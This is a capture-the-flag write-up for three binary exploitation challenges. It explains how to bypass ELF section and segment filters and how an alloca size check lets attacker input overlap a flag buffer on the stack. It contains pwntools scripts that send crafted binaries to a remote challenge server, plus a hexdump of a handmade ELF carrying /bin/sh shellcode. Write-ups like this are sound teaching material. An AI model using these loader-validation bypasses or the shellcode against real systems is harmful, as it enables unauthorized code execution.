
1. Extremely Lame Filters 1
2. Extremely Lame Filters 2
3. squ1rrel-logon

If you want to get binary or bytes of ELF probs, DM me(Discord : guardianch)

--- 
# Extremely Lame Filters 1

`elf.py` analyze input ELF file.

```python
#!/usr/bin/python3

from elf import *
from base64 import b64decode

data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!!"))
elf = parse(data)

for section in elf.sections:
    if section.sh_flags & SectionFlags.EXECINSTR:
        raise ValidationException("!!")

elf.run()
```

`fairy.py` check sections flag of input file. If there is EXECINSTR flag in `sh_flags`, program turns off. However, `sh_flags` doesn't affect execution of the program, so just remove every EXECINSTR flag. funny trick lol. If section's flag is `06`, change it to `02`. After manipulating, send it to server.

# exploit

```python
from pwn import *
import base64

p = remote('20.84.72.194', '5002')
#p = process(['python3', 'fairy.py'])

dt = base64.b64encode(open('./ex_nofilter', 'rb').read())
p.sendlineafter(b'!!', dt)
p.interactive()
```

---
# Extremely Lame Filters 2

`elf.py` is same as last prob.

```python
#!/usr/bin/python3

from elf import *
from base64 import b64decode

data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!! (almost any)"))
elf = parse(data)

if elf.header.e_type != constants.ET_EXEC:
    print("!!")
    exit(1)

for segment in elf.segments:
    if segment.p_flags & SegmentFlags.X:
        content = elf.content(segment)
        for byte in content:
            if byte != 0:
                print(">:(")
                exit(1)

elf.run()
```

`e_type` should be `ET_EXEC`. It means elf must not have any linking. It is resolved by write shellcode and compile it. Second, it check segment's `p_flags`. `p_flags` affect program execution, so we can't use method used to solve `Extremely Lame Filters 1`. We need to know new trick haha.
First, load the bytes with RW permission, and load same position with RWX permission, but very small length. In this case, because the program data is allocated in units of one page, the permission of that page changes to RWX. However, it check only a little bytes. It's easy to say, but there's actually more to care about.

```
00000000: 7f45 4c46 0201 0103 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 e800 0100 0000 0000  ..>.............
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 4000 3800 0400 4000 0000 0000  ....@.8...@.....
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0100 0000 0600 0000 0800 0000 0000 0000  ................
00000080: 0800 0100 0000 0000 0800 0100 0000 0000  ................
00000090: f500 0000 0000 0000 f500 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0100 0000 0700 0000  ................
000000b0: 0800 0000 0000 0000 0800 0100 0000 0000  ................
000000c0: 0800 0100 0000 0000 0800 0000 0000 0000  ................
000000d0: 0800 0000 0000 0000 0002 0000 0000 0000  ................
000000e0: 2f62 696e 2f73 6800 bf01 0102 0181 f7e1  /bin/sh.........
000000f0: 0103 0131 d231 f66a 3b58 0f05            ...1.1.j;X..
```

```
Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  <unknown>: 464 0x0000000000000000 0x00000001003e0002 0x00000000000100e8
                 0x0000000000000000 0x0000000000000000   W     0x38004000000000
  <unknown>: 400 0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000         0x0
  LOAD           0x0000000000000008 0x0000000000010008 0x0000000000010008
                 0x00000000000000f5 0x00000000000000f5  RW     0x0
  LOAD           0x0000000000000008 0x0000000000010008 0x0000000000010008
                 0x0000000000000008 0x0000000000000008  RWE    0x200
```

This is my binary. I set `Number of program headers` to 4, and `Start of program headers` to 0. Therefore program headers 1, 2 is abnormal. Program header 3 which has RW permission load bytes located in 0x8 to 0xfb(end of file), and Set `VirtualAddress` to 0x10008. Program header 4 which has RWX permission load only 8 bytes into the same position. Since bytes located in 0x08 to 0x0f is `\x00`, it can pass the check, and change permission to RWX. my shellcode starts at 0xe8, so set `Entry point address` to `0x100e8`. Now it works!
# exploit

```python
from pwn import *
import base64

p = remote('20.84.72.194', '5003')
#p = process(['python3', 'fairy.py'])

dt = base64.b64encode(open('./ex4', 'rb').read())
p.sendlineafter(b')', dt)
p.interactive()
```

---
# squ1rrel-logon

```bash
[*] '/mnt/d/squ1rrel/squ1rrel-logon/terminal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    Stripped:   No
```

Partial RELRO, No canary, No PIE. But Nevermind. I don't use these.

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  print_banner();
  pthread_create(&userinfo_thread, 0LL, userinfo, 0LL);
  pthread_create(&auth_thread, 0LL, auth, 0LL);
  pthread_join(auth_thread, 0LL);
  return 0;
}
```

It use two threads.

```C
void *__fastcall auth(void *a1)
{
  char s1[256]; // [rsp+10h] [rbp-210h] BYREF
  char buf[264]; // [rsp+110h] [rbp-110h] BYREF
  int v4; // [rsp+218h] [rbp-8h]
  int fd; // [rsp+21Ch] [rbp-4h]

  fd = open("flag.txt", 0);
  if ( fd < 0 )
  {
    puts("Error initializing authentication. Please contact support if on remote.");
    exit(1);
  }
  v4 = read(fd, buf, 0x100uLL);
  buf[v4 - 1] = 0;
  close(fd);
  pthread_join(userinfo_thread, 0LL);
  printf("\x1B[1;36m[SYSTEM] Enter security token: \x1B[0m");
  readline(s1, 0x100uLL);
  if ( !strcmp(s1, buf) )
  {
    puts("\x1B[1;32m[ACCESS GRANTED] Welcome to the system\x1B[0m");
    system("/bin/sh");
  }
  else
  {
    puts("\x1B[1;31m[ACCESS DENIED] Invalid security token\x1B[0m");
    puts("\x1B[1;31m[SYSTEM] Session terminated\x1B[0m");
  }
  return 0LL;
}
```

`auth` read `flag.txt` content and write in stack. Then `userinfo_thread` operate mainly.

```C
void *__fastcall userinfo(void *a1)
{
  void *v1; // rsp
  void *v2; // rsp
  _QWORD v4[2]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-18h] BYREF
  char *v7; // [rsp+20h] [rbp-10h]
  char *v8; // [rsp+28h] [rbp-8h]

  v4[1] = a1;
  puts("\x1B[1;36m[AUTH] User identification required\x1B[0m");
  printf("First Name Length: ");
  __isoc99_scanf("%ld%*c", &v6);
  printf("Surname Length: ");
  __isoc99_scanf("%ld%*c", &v5);
  if ( v6 > 0x100000000LL || v5 > 0x100000000LL )
  {
    puts("Too long for our systems.");
    exit(1);
  }
  v1 = alloca(16 * ((v6 + 23) / 0x10));
  v8 = (char *)v4;
  v2 = alloca(16 * ((v5 + 23) / 0x10));
  v7 = (char *)v4;
  printf("First Name: ");
  readline(v8, v6);
  printf("Surname: ");
  readline(v7, v5);
  printf("Authenticating Employee %s %s\n", v8, v7);
  return 0LL;
}
```

`alloca` function is like `malloc`, but it use stack space. And don't you think that the name length limit of 0x100000000 is too long? If we input big number, It allocates the stack where `flag.txt` is stored. So we can manipulate this position.